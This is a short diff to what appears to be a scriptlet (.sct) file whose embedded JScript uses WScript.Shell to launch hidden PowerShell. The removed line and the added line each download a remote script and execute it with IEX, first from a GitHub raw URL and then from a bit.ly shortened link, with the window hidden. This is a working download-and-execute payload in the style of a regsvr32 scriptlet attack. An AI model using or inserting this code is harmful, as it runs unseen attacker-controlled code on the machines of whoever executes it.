@@ -6,7 +6,8 @@ classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 <script language="JScript">
  
 <![CDATA[   
-var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/phamphuqui1998/RE_basic/master/TestPS/Test_regsvr32.ps1\');"); 
+var c= 'powershell.exe "IEX ((new-object net.webclient).downloadstring(\'http://bit.ly/2DCkJTh\'))"'; 
+new ActiveXObject("WScript.Shell").Run(c,0);
 ]]>
  
 </script>
